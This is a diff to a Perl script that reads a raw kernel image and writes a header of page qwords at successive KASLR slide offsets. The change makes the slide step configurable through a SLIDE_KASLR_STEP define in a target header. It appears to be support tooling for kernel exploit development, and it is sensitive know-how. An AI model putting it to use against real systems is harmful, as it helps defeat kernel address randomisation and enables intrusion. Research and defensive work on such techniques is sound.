@@ -2,9 +2,9 @@
 use strict;
 use warnings;
 
-@ARGV == 3 or die
-    "usage: $0 RAW_IMAGE PROBE_OFFSET OUTPUT_HEADER\n";
-my ($image_path, $probe_text, $output_path) = @ARGV;
+@ARGV == 4 or die
+    "usage: $0 RAW_IMAGE PROBE_OFFSET TARGET_H OUTPUT_HEADER\n";
+my ($image_path, $probe_text, $target_h, $output_path) = @ARGV;
 
 $probe_text =~ /\A(?:0x)?[0-9a-fA-F]+\z/
     or die "invalid probe offset: $probe_text\n";
@@ -12,14 +12,32 @@ my $probe_offset = hex($probe_text);
 
 open my $image_fh, '<:raw', $image_path
     or die "open $image_path: $!\n";
-local $/;
-my $image = <$image_fh>;
+my $image;
+{
+    local $/;
+    $image = <$image_fh>;
+}
 close $image_fh or die "close $image_path: $!\n";
 
 my @page_offsets = (0x000, 0x200, 0x400, 0x600,
                     0x800, 0xa00, 0xc00, 0xe00);
+
+# KASLR slide step: prefer SLIDE_KASLR_STEP defined in the target header,
+# otherwise fall back to the default 0x10000 (64KB).
+my $step = 0x10000;
+if (open my $tf, '<', $target_h) {
+    while (<$tf>) {
+        if (/^\s*#\s*define\s+SLIDE_KASLR_STEP\s+0x([0-9a-fA-F]+)/) {
+            $step = hex($1);
+            last;
+        }
+    }
+    close $tf;
+}
+my $rows = int($probe_offset / $step) + 1;
+
 my @rows;
-for my $slide (map { $_ * 0x10000 } 0 .. 31) {
+for my $slide (map { $_ * $step } 0 .. $rows - 1) {
     my $page_source = $probe_offset - $slide;
     $page_source >= 0
         or die sprintf("slide 0x%x exceeds probe offset 0x%x\n",
@@ -91,5 +109,6 @@ for my $row (@rows) {
     }
 }
 close $verify_fh or die "close verification input: $!\n";
-printf "verified 32 rows and 256 source qwords at probe 0x%x\n",
-       $probe_offset;
+printf "verified %d rows and %d source qwords at probe 0x%x (slide step 0x%x)\n",
+       scalar(@rows), scalar(@rows) * scalar(@page_offsets), $probe_offset,
+       $step;
